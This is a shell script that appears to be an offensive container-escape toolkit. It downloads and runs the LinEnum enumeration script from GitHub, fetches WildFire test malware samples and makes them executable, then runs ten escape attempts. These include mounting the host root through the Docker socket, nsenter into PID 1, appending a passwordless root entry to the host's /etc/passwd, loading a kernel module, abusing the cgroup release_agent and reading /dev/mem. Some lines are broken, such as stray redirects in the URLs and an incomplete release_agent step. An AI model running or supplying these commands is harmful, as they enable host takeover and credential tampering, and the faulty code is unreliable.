#!/bin/sh
# Step 1: Download Enumeration Script using wget (fallback to curl if wget isn't available)
if command -v wget >/dev/null 2>&1; then
  echo "[+] Downloading enumeration script using wget..."
  wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh>/enum_script.sh -O /tmp/enum_script.sh
elif command -v curl >/dev/null 2>&1; then
  echo "[+] Downloading enumeration script using curl..."
  curl -o /tmp/enum_script.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh>/enum_script.sh
else
  echo "[-] Neither wget nor curl is available. Exiting."
  exit 1
fi

# Step 2: Make the Enumeration Script Executable
echo "[+] Making the enumeration script executable..."
chmod +x /tmp/enum_script.sh

# Step 3: Run the Enumeration Script
echo "[+] Running the enumeration script..."
sh /tmp/enum_script.sh

# Step 4: Download Sample Files from WildFire for Testing Purposes

echo "[+] Downloading PE Sample..."
if command -v wget >/dev/null 2>&1; then
  wget https://wildfire.paloaltonetworks.com/publicapi/test/pe -O /tmp/pe_sample
elif command -v curl >/dev/null 2>&1; then
  curl -o /tmp/pe_sample https://wildfire.paloaltonetworks.com/publicapi/test/pe
fi


echo "[+] Downloading APK Sample..."
if command -v wget >/dev/null 2>&1; then
  wget https://wildfire.paloaltonetworks.com/publicapi/test/apk -O /tmp/apk_sample
elif command -v curl >/dev/null 2>&1; then
  curl -o /tmp/apk_sample https://wildfire.paloaltonetworks.com/publicapi/test/apk
fi


echo "[+] Downloading MacOSX Sample..."
if command -v wget >/dev/null 2>&1; then
  wget https://wildfire.paloaltonetworks.com/publicapi/test/macos -O /tmp/macosx_sample
elif command -v curl >/dev/null 2>&1; then
  curl -o /tmp/macosx_sample https://wildfire.paloaltonetworks.com/publicapi/test/macos
fi


echo "[+] Downloading ELF Sample..."
if command -v wget >/dev/null 2>&1; then
  wget http://wildfire.paloaltonetworks.com/publicapi/test/elf -O /tmp/elf_sample
elif command -v curl >/dev/null 2>&1; then
  curl -o /tmp/elf_sample http://wildfire.paloaltonetworks.com/publicapi/test/elf
fi

# Step 5: Make the Downloaded Samples Executable
echo "[+] Making the downloaded samples executable..."
chmod +x /tmp/pe_sample /tmp/apk_sample /tmp/macosx_sample /tmp/elf_sample

# Additional Step: Attempt Container Escape (Educational Purposes)

# Scenario 1: Check for Docker Socket Access
if [ -S /var/run/docker.sock ]; then
  echo "[!] Docker socket found. Attempting escape using Docker client..."
  docker run -v /:/host --rm -it busybox chroot /host sh
fi

# Scenario 2: Exploit Privileged Container
if grep -q 'docker' /proc/1/cgroup; then
  echo "[!] Privileged container detected. Attempting escape via host PID namespace..."
  nsenter -t 1 -m -u -n -i sh
fi

# Scenario 3: Access Mounted Host Filesystem
if mount | grep -q "/host"; then
  echo "[!] Host filesystem is mounted. Attempting to access sensitive directories..."
  ls /host/etc /host/root /host/var
fi

# Scenario 4: Misconfigured Capabilities
capabilities=$(cat /proc/1/status | grep CapEff)
if echo "$capabilities" | grep -q "ffffffffffffffff"; then
  echo "[!] High capabilities detected. Attempting to exploit..."
  # Example: Overwriting sensitive host files
  echo "root::0:0:root:/root:/bin/sh" >> /host/etc/passwd
fi

# Scenario 5: Breakout via Sensitive Host Path Mounts
if [ -d /host/proc ]; then
  echo "[!] /host/proc is mounted. Attempting to access host process information..."
  cat /host/proc/1/cmdline
fi

# Scenario 6: Kernel Module Loading (Privileged Containers)
if [ -w /lib/modules ]; then
  echo "[!] Writable /lib/modules found. Attempting to load a kernel module..."
  insmod /lib/modules/custom_module.ko
fi

# Scenario 7: Escape via Host Network Namespace
if [ -e /host/run/netns ]; then
  echo "[!] Host network namespace found. Attempting to access..."
  ip netns exec /host/run/netns/default ip a
fi

# Scenario 8: Access Host D-Bus
if [ -S /var/run/dbus/system_bus_socket ]; then
  echo "[!] D-Bus system bus socket found. Attempting to interact with host services..."
  dbus-send --system --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames
fi

# Scenario 9: Use cgroups to Escalate Privileges
if [ -d /sys/fs/cgroup ]; then
  echo "[!] Cgroups directory found. Attempting to escape via cgroup notification on release agent..."
  echo "/bin/sh" > /sys/fs/cgroup/release_agent
fi

# Scenario 10: Access Host Devices
if [ -e /dev/mem ]; then
  echo "[!] /dev/mem found. Attempting to read host memory..."
  dd if=/dev/mem bs=1k count=1 | strings
fi
